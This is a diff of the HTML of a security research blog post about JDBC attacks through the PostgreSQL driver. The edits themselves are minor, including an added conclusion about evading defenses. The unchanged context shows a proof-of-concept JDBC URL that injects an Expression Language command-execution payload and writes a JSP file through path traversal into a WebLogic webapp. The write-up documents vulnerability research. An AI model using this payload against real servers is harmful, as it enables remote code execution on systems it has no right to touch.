@@ -154,7 +154,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>I made a presentation about JDBC attack interface at HITB security conference in 2021. </p>
+        <h5 id="0x01-Forewords"><a href="#0x01-Forewords" class="headerlink" title="0x01 Forewords"></a>0x01 Forewords</h5><p>I made a presentation about JDBC attack interface at HITB Singapore security conference in 2021. </p>
 <p>The title of this talk is <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code> , if you are interested, the slide link is as follow</p>
 <p><a target="_blank" rel="noopener" href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf</a></p>
 <p>However PostgreSQL database was not included in that presentation, and recently JDBC attacks in PostgreSQL database is mentioned. So I make a capsule write-up , I consider it is the exta chapter of <code>&lt;Make JDBC Attacks Brilliant Again&gt;</code>.</p>
@@ -246,7 +246,7 @@
 <pre><code>Could not establish a connection because of java.lang.IllegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: &quot;Ru&quot;&lt;br/&gt;
 </code></pre>
 <p><img src="/images/pasted-126.png" alt="upload successful"></p>
-<p>Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding <code>%</code> exceptionally.By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3  is supportive of Expression Language by default.</p>
+<p>Suddenly Expression Language comes to my mind, it can replace JSP to avoid decoding <code>%</code> exceptionally. By the way, Servlet &lt;=2.3 is not supportive of Expression Language by default.It’s necessary to make sure the Weblogic Server built-in Servlet version. In my illustration, Weblogic Server14 with its built-in Servlet 4.0. Servlet &gt; 2.3  is supportive of Expression Language by default.</p>
 <p><img src="/images/pasted-127.png" alt="upload successful"></p>
 <p>Everything is ready. The final PoC like this</p>
 <pre><code>jdbc:postgresql://127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp
@@ -362,6 +362,7 @@
 <p><img src="/images/pasted-106.png" alt="upload successful"></p>
 <p>If <code>/</code> or <code>/[SPACE]</code> is appended at the end of the file name.In case of the non-blank characters existing behind the delimiter <code>/</code>,<br>the characters behind <code>/</code> will be obtained as the file name. </p>
 <p><img src="/images/pasted-107.png" alt="upload successful"></p>
+<h5 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03 Conclusion"></a>0x03 Conclusion</h5><p>The different normalization results depends on the implement of varied jar libraries implement and the personal habbits of developers. The in-depth research of normalization diversities will help us evade defense.</p>
 
       
 
@@ -417,7 +418,7 @@
 
         
         <a href="/2022/01/25/PostgreSQL-driver/" class="archive-article-date">
-  	<time datetime="2022-01-25T05:05:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-25</time>
+  	<time datetime="2022-01-25T05:05:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-25</time>
 </a>
         
       </header>
